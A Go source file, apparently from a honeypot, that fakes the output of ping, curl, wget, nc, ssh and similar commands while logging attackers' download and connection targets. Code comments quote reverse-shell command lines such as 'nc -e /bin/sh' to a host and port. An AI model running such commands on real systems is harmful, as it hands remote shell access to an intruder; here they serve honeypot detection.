// Package vnet 虚拟网络仿真层：仿真出站网络行为（ping/curl/wget/nc/traceroute），
// 绝不真实发包。所有网络目标写入事件，供横向移动意图分析。
package vnet

import (
	"fmt"
	"log/slog"
	"math/rand/v2"
	"strings"
	"time"

	"honeypot-go/internal/event"
)

// VNet 网络仿真器
type VNet struct {
	bus    *event.Bus
	logger *slog.Logger
}

// New 创建网络仿真器
func New(bus *event.Bus, logger *slog.Logger) *VNet {
	return &VNet{bus: bus, logger: logger}
}

// Exec 执行网络命令。返回 (输出, exit code, 是否处理)。
// args 为已展开参数（args[0] 为命令名）。
func (v *VNet) Exec(sessionID string, args []string) ([]byte, int, bool) {
	if len(args) == 0 {
		return nil, 0, false
	}
	switch args[0] {
	case "ping":
		return v.ping(args[1:]), 0, true
	case "curl":
		return v.curl(sessionID, args[1:]), 0, true
	case "wget":
		return v.wget(sessionID, args[1:]), 0, true
	case "nc", "ncat":
		return v.nc(sessionID, args[1:]), 1, true
	case "traceroute":
		return v.traceroute(args[1:]), 0, true
	case "ifconfig":
		return v.ifconfig(args[1:]), 0, true
	case "ip":
		return v.ip(args[1:]), 0, true
	case "dig", "nslookup", "host":
		return v.dns(args), 0, true
	case "route":
		return []byte("Kernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         10.0.2.2        0.0.0.0         UG    0      0        0 eth0\n10.0.2.0       0.0.0.0         255.255.255.0   U     0      0        0 eth0\n"), 0, true
	case "ssh":
		return v.ssh(args[1:]), 255, true
	case "scp":
		return []byte("scp: Connection refused\n"), 1, true
	case "sftp":
		return []byte("sftp: Connection refused\n"), 1, true
	case "telnet":
		return []byte("telnet: Unable to connect to remote host: Connection refused\n"), 1, true
	case "ftp":
		return []byte("ftp: connect: Connection refused\n"), 1, true
	}
	return nil, 0, false
}

// host 提取参数中的目标主机（跳过选项）
func host(args []string) string {
	for _, a := range args {
		if strings.HasPrefix(a, "-") {
			continue
		}
		return a
	}
	return ""
}

// firstURL 提取参数中的第一个目标 URL/主机，正确跳过"带值"选项及其取值。
// withValue 为已知需要消费下一个参数的选项集合（按工具区分，如 wget 的 -O 带值
// 而 curl 的 -O/--remote-name 不带值）。未列入的选项一律视为不带值，宁可漏报
// 选项值也不能把真正的 URL 跳过。
func firstURL(args []string, withValue map[string]bool) string {
	for i := 0; i < len(args); i++ {
		a := args[i]
		if a == "--" {
			if i+1 < len(args) {
				return args[i+1]
			}
			return ""
		}
		if strings.HasPrefix(a, "--") {
			// --opt=value 形式：选项值内联，直接跳过
			if strings.Contains(a, "=") {
				continue
			}
			if withValue[a] && i+1 < len(args) {
				i++
			}
			continue
		}
		if strings.HasPrefix(a, "-") && len(a) > 1 {
			if len(a) > 2 {
				// 短选项内联值（-o/tmp/x）或合并选项（-sS）：不消费下一个参数
				continue
			}
			if withValue[a] && i+1 < len(args) {
				i++
			}
			continue
		}
		return a
	}
	return ""
}

// ncValueOptChars nc/ncat 的短选项取值字符（合并短选项时按字符逐个识别）：
// e=执行命令（反弹 shell 常见），p=本地端口，s=源地址，w=超时，q=退出条件，i=间隔。
// 其余如 l(监听)/v/n/z/u/r/t 均为无值开关。
// 注意：-c 在 GNU netcat/ncat 中语义不一（crlf 开关 vs sh-exec），不纳入取值表，
// 宁可 target 多解析一个 token 也不误跳过真实目标。
const ncValueOptChars = "epswqi"

// ncHostPort 解析 nc/ncat 参数中的目标主机与端口，正确处理带值选项及其取值：
//
//	nc -lvp 4444                      -> target="",        port="4444"     (监听)
//	nc 10.0.0.5 4444                  -> target="10.0.0.5", port="4444"
//	nc -e /bin/sh 10.0.0.5 4444       -> target="10.0.0.5", port="4444"     (反弹 shell)
//	ncat --exec /bin/sh 10.0.0.5 4444 -> target="10.0.0.5", port="4444"
func ncHostPort(args []string) (target, port string) {
	for i := 0; i < len(args); i++ {
		a := args[i]
		switch {
		case a == "--":
			continue
		case strings.HasPrefix(a, "--"):
			// --opt=value：选项值内联，直接跳过
			if strings.Contains(a, "=") {
				continue
			}
			switch a {
			case "--exec", "--sh-exec", "--source", "--local-port", "--wait",
				"--quit-after", "--interval", "--allow", "--deny":
				if i+1 < len(args) {
					i++
				}
			}
			continue
		case strings.HasPrefix(a, "-") && len(a) > 1:
			// 短选项，可能合并（-lvp）或带内联值（-p4444、-e/bin/sh）
			body := a[1:]
			for j := 0; j < len(body); j++ {
				c := body[j]
				if !strings.ContainsRune(ncValueOptChars, rune(c)) {
					continue
				}
				if j+1 < len(body) {
					// 内联值形式：-p4444 / -e/bin/sh，值取剩余字符
					if c == 'p' {
						port = body[j+1:]
					}
					break
				}
				// 带值选项位于合并串末尾（-lvp）：消费下一个参数
				if i+1 >= len(args) {
					break
				}
				if c == 'p' {
					port = args[i+1]
				}
				i++
				break
			}
			continue
		default:
			// 非选项 token：第一个是目标主机，后续纯数字是端口
			if target == "" {
				target = a
			} else if port == "" && isAllDigits(a) {
				port = a
			}
		}
	}
	return target, port
}

// curlOptsWithValue curl 带值选项（-O/--remote-name 不带值，需排除）
var curlOptsWithValue = map[string]bool{
	"-o": true, "-d": true, "-F": true, "-H": true, "-u": true, "-A": true,
	"-e": true, "-b": true, "-c": true, "-x": true, "-T": true, "-w": true,
	"-X": true, "-D": true, "-E": true, "-K": true, "-m": true, "-r": true,
	"-C": true, "-Y": true, "-a": true, "-t": true, "-P": true, "-Q": true,
	"-U": true, "-V": true,
	"--output": true, "--output-document": true, "--data": true, "--data-raw": true,
	"--data-urlencode": true, "--form": true, "--header": true, "--user": true,
	"--user-agent": true, "--referer": true, "--cookie": true, "--cookie-jar": true,
	"--proxy": true, "--upload-file": true, "--write-out": true, "--url": true,
	"--resolve": true, "--connect-to": true, "--request": true, "--max-time": true,
	"--connect-timeout": true, "--limit-rate": true, "--max-filesize": true,
	"--max-redirs": true, "--cert": true, "--key": true, "--cacert": true,
	"--capath": true, "--pass": true, "--range": true, "--retry": true,
	"--retry-delay": true, "--retry-max-time": true, "--speed-limit": true,
	"--speed-time": true, "--expect100-timeout": true, "--oauth2-bearer": true,
	"--netrc-file": true, "--aws-sigv4": true, "--interface": true, "--dns-servers": true,
	"--dns-interface": true, "--dns-ipv4-addr": true, "--dns-ipv6-addr": true,
}

// wgetOptsWithValue wget 带值选项（-O/--output-document 带值；-q/-s/-N/-r 等不带值）
var wgetOptsWithValue = map[string]bool{
	"-O": true, "-P": true, "-o": true, "-U": true, "-e": true, "-b": true,
	"-T": true, "-t": true, "-Q": true, "-w": true, "-B": true, "-p": true,
	"-a": true, "-R": true, "-X": true, "-Y": true, "-Z": true, "-k": true,
	"-n": true, "-A": true, "-I": true, "-D": true, "-E": true,
	"--output-document": true, "--directory-prefix": true, "--output-file": true,
	"--user-agent": true, "--execute": true, "--tries": true, "--timeout": true,
	"--wait": true, "--quota": true, "--post-data": true, "--post-file": true,
	"--save-cookies": true, "--load-cookies": true, "--user": true,
	"--password": true, "--method": true, "--body-data": true, "--body-file": true,
	"--header": true, "--referer": true, "--base": true, "--auth-no-challenge": true,
	"--max-redirect": true, "--max-files": true, "--max-filesize": true,
	"--accept": true, "--reject": true, "--domains": true, "--exclude-domains": true,
	"--include-directories": true, "--exclude-directories": true,
	"--bind-address": true, "--auth": true, "--secure-protocol": true,
}

func (v *VNet) ping(args []string) []byte {
	target := host(args)
	if target == "" {
		target = "example.com"
	}
	// 合成一个"解析"出的 IP
	fakeIP := fmt.Sprintf("%d.%d.%d.%d", rand.IntN(220)+10, rand.IntN(255), rand.IntN(255), rand.IntN(254)+1)
	var b strings.Builder
	fmt.Fprintf(&b, "PING %s (%s) 56(84) bytes of data.\n", target, fakeIP)
	pkts := 4
	for i := 1; i <= pkts; i++ {
		rtt := 8.0 + rand.Float64()*20
		fmt.Fprintf(&b, "64 bytes from %s: icmp_seq=%d ttl=52 time=%.1f ms\n", fakeIP, i, rtt)
		if i < pkts {
			time.Sleep(200 * time.Millisecond)
		}
	}
	avg := 18.0 + rand.Float64()*6
	fmt.Fprintf(&b, "\n--- %s ping statistics ---\n", target)
	fmt.Fprintf(&b, "%d packets transmitted, %d received, 0%% packet loss, time %dms\n", pkts, pkts, pkts*300)
	fmt.Fprintf(&b, "rtt min/avg/max/mdev = %.2f/%.2f/%.2f/0.531 ms\n", avg-1.8, avg, avg+2.1)
	return []byte(b.String())
}

func (v *VNet) curl(sessionID string, args []string) []byte {
	target := firstURL(args, curlOptsWithValue)
	v.recordDownload(sessionID, "curl", target)
	body := "#!/bin/bash\n# (download decoy)\n"
	return []byte(fmt.Sprintf("  %% Total    %% Received %% Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100   %d  100   %d    0     0   %d      0      0:00:00 --:--:--     0   %d\n",
		len(body), len(body), len(body)*2, len(body)*2))
}

func (v *VNet) wget(sessionID string, args []string) []byte {
	target := firstURL(args, wgetOptsWithValue)
	if target == "" {
		target = "http://example.com/"
	}
	v.recordDownload(sessionID, "wget", target)
	// 从 URL 提取文件名
	fname := "index.html"
	if i := strings.LastIndex(target, "/"); i >= 0 && i < len(target)-1 {
		fname = target[i+1:]
	}
	now := time.Now().Format("2006-01-02 15:04:05")
	var b strings.Builder
	fmt.Fprintf(&b, "--%s--  %s\n", now, target)
	fmt.Fprintf(&b, "Resolving %s... done.\n", target)
	fmt.Fprintf(&b, "HTTP request sent, awaiting response... 200 OK\n")
	fmt.Fprintf(&b, "Length: 1234 (1.2K) [application/octet-stream]\n")
	fmt.Fprintf(&b, "Saving to: '%s'\n\n", fname)
	fmt.Fprintf(&b, "%s    100%%[===================>]   1.2K  --.-KB/s    in 0s\n\n", fname)
	fmt.Fprintf(&b, "%s (%s) - '%s' saved [1234/1234]\n", now, "2.35 MB/s", fname)
	return []byte(b.String())
}

func (v *VNet) nc(sessionID string, args []string) []byte {
	// 目标提取使用 ncHostPort：正确跳过 -e/--exec 等带值选项及其取值，
	// 否则 `nc -e /bin/sh 10.0.0.5 4444` 会把 /bin/sh 误记为目标导致横向移动检测漏报
	target, port := ncHostPort(args)
	if target == "" {
		target = "0.0.0.0"
	}
	v.bus.Publish(event.New(event.TypeConnectAttempt, map[string]any{
		"session_id": sessionID,
		"target":     target,
		"port":       port,
		"tool":       "nc",
	}))
	if strings.Contains(strings.Join(args, " "), "-l") {
		// 监听模式：仿真一个反弹 shell 侦听
		return []byte(fmt.Sprintf("listening on [any] %s ...\n", port))
	}
	return []byte(fmt.Sprintf("nc: connect to %s port %s (tcp) failed: Connection timed out\n", target, port))
}

func (v *VNet) traceroute(args []string) []byte {
	target := host(args)
	if target == "" {
		target = "8.8.8.8"
	}
	var b strings.Builder
	fmt.Fprintf(&b, "traceroute to %s (%s), 30 hops max, 60 byte packets\n", target, target)
	hops := rand.IntN(6) + 3
	for i := 1; i <= hops; i++ {
		ip := fmt.Sprintf("10.0.%d.%d", i, rand.IntN(250)+1)
		fmt.Fprintf(&b, " %2d  %s (%s)  %.3f ms  %.3f ms  %.3f ms\n", i, ip, ip, rand.Float64()*3, rand.Float64()*3, rand.Float64()*3)
	}
	fmt.Fprintf(&b, " %2d  %s (%s)  %.3f ms  %.3f ms  %.3f ms\n", hops+1, target, target, rand.Float64()*30, rand.Float64()*30, rand.Float64()*30)
	return []byte(b.String())
}

func (v *VNet) ifconfig(args []string) []byte {
	_ = args
	return []byte(`eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        inet6 fe80::a00:27ff:feab:cdef  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ab:cd:ef  txqueuelen 1000  (Ethernet)
        RX packets 123456  bytes 987654321 (987.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 65432  bytes 12345678 (12.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
`)
}

func (v *VNet) ip(args []string) []byte {
	if len(args) > 0 && args[0] == "addr" {
		return []byte(`1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
`)
	}
	return []byte("Usage: ip [ OPTIONS ] OBJECT { COMMAND | help }\n")
}

func (v *VNet) dns(args []string) []byte {
	target := host(args)
	if target == "" {
		target = "example.com"
	}
	return []byte(fmt.Sprintf("; <<>> DiG 9.18.1-1ubuntu1.3-Ubuntu <<>> %s\n;; ANSWER SECTION:\n%s.\t\t300\tIN\tA\t93.184.216.34\n", target, target))
}

func (v *VNet) ssh(args []string) []byte {
	// 仿真 SSH 到内网其他主机：常见的横向移动尝试
	target := host(args)
	if target == "" {
		target = "host"
	}
	return []byte(fmt.Sprintf("ssh: connect to host %s port 22: Connection timed out\n", target))
}

func (v *VNet) recordDownload(sessionID, tool, url string) {
	if url == "" {
		url = "<unknown>"
	}
	v.bus.Publish(event.New(event.TypeDownloadAttempt, map[string]any{
		"session_id": sessionID,
		"tool":       tool,
		"url":        url,
	}))
	v.logger.Warn("download attempt captured",
		"session_id", sessionID,
		"tool", tool,
		"url", url,
	)
}

func isAllDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, c := range s {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}
